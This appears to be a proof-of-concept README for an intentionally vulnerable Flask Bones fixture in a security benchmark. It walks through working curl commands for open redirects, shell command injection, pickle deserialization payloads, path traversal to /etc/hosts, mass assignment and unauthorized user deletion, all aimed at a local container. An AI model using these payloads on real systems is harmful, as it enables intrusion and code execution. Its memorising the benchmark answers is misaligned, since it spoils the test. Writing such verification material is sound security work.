# Flask Bones VulnBench 2.0 proof of concepts

Run these commands only against a local instance of this intentionally
vulnerable fixture. The payloads were verified against this fixture on
2026-08-17 and write only disposable marker files under `/tmp` in the app
container.

This fixture is based on the Flask Bones web application and covers ten
attacker-reachable flows: two open redirects, two command injections, two
unsafe deserializations, two path traversals, mass assignment, and arbitrary
user deletion. The local Compose stack starts the Flask app and RQ worker,
MailHog on port 8025, PostgreSQL, Redis, and Memcached. The worker must be
running before retrieving the verification email in the second open-redirect
POC.

All requests use `Host: app.docker:5000` because `SERVER_NAME` is pinned to
that value in `app/config.py`. Requests with a different host can return 404
even when the route is valid.

## Start the local stack and seed users

Run from `fixtures/app-project-flask-bones/project`:

```sh
docker-compose up -d --build
docker-compose run --rm app flask create-db
docker-compose run --rm app flask populate-db --num_users 3
```

The seed command creates an active administrator with username `admin` and
password `test123`, plus three fake users. The seeded administrator is user
ID 4, which the investigation POC uses below.

## Open redirect — login return-to

The login route redirects to the unvalidated `next` query parameter. This
request also captures the authenticated session used by later POCs:

```sh
curl -sS -i -H "Host: app.docker:5000" -c cookies.txt -X POST \
  "http://localhost:5000/login?next=https://example.com/" \
  -d "username=admin&password=test123" \
  | grep -i "^HTTP\|^Location"
```

Expected result: `302 FOUND` with `Location: https://example.com/`.

## Open redirect — email verification return-to

Register a throwaway account, retrieve its valid signed verification token
from the local MailHog instance, and append an external `next` target:

```sh
curl -sS -X POST http://localhost:5000/register \
  -H "Host: app.docker:5000" \
  -d "username=redirpoc&email=redirpoc@example.com&password=Passw0rd1&confirm=Passw0rd1&accept_tos=y"

TOKEN=$(curl -sS "http://localhost:8025/api/v2/messages" | python3 -c "
import json, re, sys
body = json.load(sys.stdin)['items'][0]['Content']['Body']
print(re.search(r'verify/(\S+)', body).group(1))
")

curl -sS -i -H "Host: app.docker:5000" \
  "http://localhost:5000/verify/${TOKEN}?next=https://example.com/" \
  | grep -i "^HTTP\|^Location"
```

Expected result: `302 FOUND` with `Location: https://example.com/`. The
request also activates `redirpoc` for the authenticated-attacker check below.

## Command injection — connectivity diagnostic

The connectivity diagnostic concatenates the `host` form field into a `ping`
command executed with `shell=True`:

```sh
curl -sS -H "Host: app.docker:5000" -b cookies.txt -X POST \
  http://localhost:5000/user/diagnostics \
  -d "host=127.0.0.1; id; #" \
  | grep -oE "uid=[^<]*"
```

Expected result: output containing the app process identity, such as
`uid=0(root)`.

## Command injection — abuse investigation lookup

The abuse-investigation route independently concatenates its `host` form
field into a reverse-DNS shell command:

```sh
curl -sS -L --resolve app.docker:5000:127.0.0.1 \
  -H "Host: app.docker:5000" -b cookies.txt -X POST \
  "http://app.docker:5000/user/investigate/4" \
  -d "host=127.0.0.1; id; #" \
  | grep -i "uid=" -A1
```

Expected result: output containing the app process identity.

## Insecure deserialization — list preferences cookie

The `/user/list` view base64-decodes and unpickles the client-controlled
`list_prefs` cookie without an integrity check:

```sh
PAYLOAD=$(python3 -c "
import base64, os, pickle
class Exploit:
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned_list_prefs 2>&1',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
")

curl -sS -H "Host: app.docker:5000" -b cookies.txt \
  --cookie "list_prefs=$PAYLOAD" \
  http://localhost:5000/user/list \
  -o /dev/null -w "http_status=%{http_code}\n"

docker-compose exec app sh -c "test -s /tmp/pwned_list_prefs && grep uid= /tmp/pwned_list_prefs"
```

The marker file containing the process identity proves code execution. An
HTTP 500 is acceptable because the payload executes during deserialization
before the handler uses the unexpected return value.

## Insecure deserialization — registration draft

The registration route base64-decodes and unpickles the unauthenticated
`draft` query parameter without an integrity check:

```sh
PAYLOAD=$(python3 -c "
import base64, os, pickle
class Exploit:
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned_register_draft 2>&1',))
print(base64.urlsafe_b64encode(pickle.dumps(Exploit())).decode())
")

curl -sS -H "Host: app.docker:5000" -G \
  "http://localhost:5000/register" \
  --data-urlencode "draft=$PAYLOAD" \
  -o /dev/null -w "http_status=%{http_code}\n"

docker-compose exec app sh -c "test -s /tmp/pwned_register_draft && grep uid= /tmp/pwned_register_draft"
```

The marker file proves unauthenticated code execution. As above, the HTTP
response may be 500 after the payload has already executed.

## Path traversal — self-service account export

First request the legitimate report as a control, then traverse outside the
reports directory:

```sh
curl -sS -H "Host: app.docker:5000" -b cookies.txt \
  "http://localhost:5000/user/export?name=activity.csv"

curl -sS -H "Host: app.docker:5000" -b cookies.txt \
  "http://localhost:5000/user/export?name=../../../../../../etc/hosts"
```

Expected result: the control returns CSV content, while the traversal returns
the container's `/etc/hosts`.

## Path traversal — export for another user

The nominally admin-facing route performs the same unguarded join:

```sh
curl -sS -H "Host: app.docker:5000" -b cookies.txt \
  "http://localhost:5000/user/export/1?name=activity.csv"

curl -sS -H "Host: app.docker:5000" -b cookies.txt \
  "http://localhost:5000/user/export/1?name=../../../../../../etc/hosts"
```

Expected result: the control returns CSV content, while the traversal returns
the container's `/etc/hosts`.

## Confirm the authenticated-attacker boundary

The diagnostics, investigation, and per-user export routes are described as
administrative features but enforce only `login_required`; they do not check
`is_admin`. Log in as the self-registered account activated above:

```sh
curl -sS -i -H "Host: app.docker:5000" -c user-cookies.txt -X POST \
  "http://localhost:5000/login" \
  -d "username=redirpoc&password=Passw0rd1"

curl -sS -H "Host: app.docker:5000" -b user-cookies.txt -X POST \
  http://localhost:5000/user/diagnostics \
  -d "host=127.0.0.1; id; #" \
  | grep -oE "uid=[^<]*"

curl -sS -H "Host: app.docker:5000" -b user-cookies.txt \
  "http://localhost:5000/user/export/1?name=../../../../../../etc/hosts"
```

Both requests succeed for the non-admin account. The investigation route can
be exercised the same way with `POST /user/investigate/1`. An unauthenticated
request to `/user/diagnostics` returns 401, so the attacker model is any user
who can self-register rather than an administrator.

## Mass assignment — promote a low-privilege account

The edit route accepts `is_admin` and `active` from the request, then applies
them to the user selected by the URL without checking whether the requester
may edit that record. In the fresh database created above, `redirpoc` is user
ID 5 (the seeded administrator and three fake users occupy IDs 1–4). Reuse
the non-admin `user-cookies.txt` session from the preceding section:

```sh
curl -sS -i -H "Host: app.docker:5000" -b user-cookies.txt -X POST \
  http://localhost:5000/user/edit/5 \
  -d "username=redirpoc&email=redirpoc@example.com&is_admin=y&active=y" \
  | grep -i "^HTTP"

docker-compose exec app python -c "
from serve import app
from app.user.models import User
app.app_context().push()
print(User.query.filter_by(username='redirpoc').first().is_admin)
"
```

Expected result: the POST returns `200 OK` and the database query prints
`True`. The same endpoint accepts any numeric user ID, so the authenticated
attacker can also modify another user's editable fields. In this fixture,
`is_admin` primarily controls UI visibility; the security defect is the
unauthorized persistence of security-sensitive fields, not an assumption that
the flag unlocks every server endpoint.

## Missing access control — delete another user

The deletion route also checks only that a user is logged in. Delete one of
the disposable seeded accounts using the same low-privilege session:

```sh
curl -sS -i -H "Host: app.docker:5000" -b user-cookies.txt \
  http://localhost:5000/user/delete/1 \
  | grep -i "^HTTP\|^Location"

docker-compose exec app python -c "
from serve import app
from app.user.models import User
app.app_context().push()
print(User.query.get(1) is None)
"
```

Expected result: the request returns `302 FOUND` and the database query prints
`True`, demonstrating that a self-registered, non-admin account can delete an
unrelated account. The endpoint mutates state through `GET`, which also makes
it susceptible to cross-site request triggering; the demonstrated issue does
not rely on that additional weakness.

## Clean up

```sh
docker-compose down -v
rm -f cookies.txt user-cookies.txt
```
